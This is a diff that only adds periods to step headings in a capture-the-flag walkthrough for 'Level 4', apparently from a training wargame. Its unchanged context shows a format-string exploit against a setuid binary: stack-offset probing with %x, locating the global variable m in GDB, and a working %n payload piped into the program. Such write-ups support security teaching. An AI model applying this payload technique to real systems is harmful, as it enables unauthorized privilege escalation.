@@ -1,12 +1,12 @@
 # Level 4 Walkthrough
 
-1. **Connect to the target machine**
+1. **Connect to the target machine.**
 
 	```bash
 	ssh level4@<vm-ip> -p 4242
 	```
 
-2. **Check the files**
+2. **Check the files.**
 
 	```bash
 	ls -l
@@ -18,7 +18,7 @@
 	-rwsr-s---+ 1 level3 users 5138 Mar  6  2016 level4
 	```
 
-3. **Test the binary**
+3. **Test the binary.**
 
 	```bash
 	./level4
@@ -27,7 +27,7 @@
 	It waits for input, echoes the input, and exits..
 
 
-4. **Copy the binary locally for analysis**
+4. **Copy the binary locally for analysis.**
 
 	```bash
 	scp -P 4242 level4@<vm-ip>:/home/user/level4/level4 .
@@ -35,7 +35,7 @@
 
 	Disassemble using Ghidra.
 
-5. **Find the correct stack offset for our input**
+5. **Find the correct stack offset for our input.**
 
 	We send a sequence of `%x` format specifiers until we see our `AAAA` in hex:
 
@@ -51,7 +51,7 @@
 
 	Here, `41414141` (AAAA) appears at position **12**.
 
-6. **Check binary in GDB for variables**
+6. **Check binary in GDB for variables.**
 
 	```bash
 	gdb level3
@@ -66,7 +66,7 @@
 
 	This means `m` is a global variable at address in little-endian format: `\x10\x98\x04\x08`
 
-7. **Build and execute the payload**
+7. **Build and execute the payload.**
 
 	```bash
 	(printf '\x10\x98\x04\x08'; echo '%16930112d%12$n') | ./level4
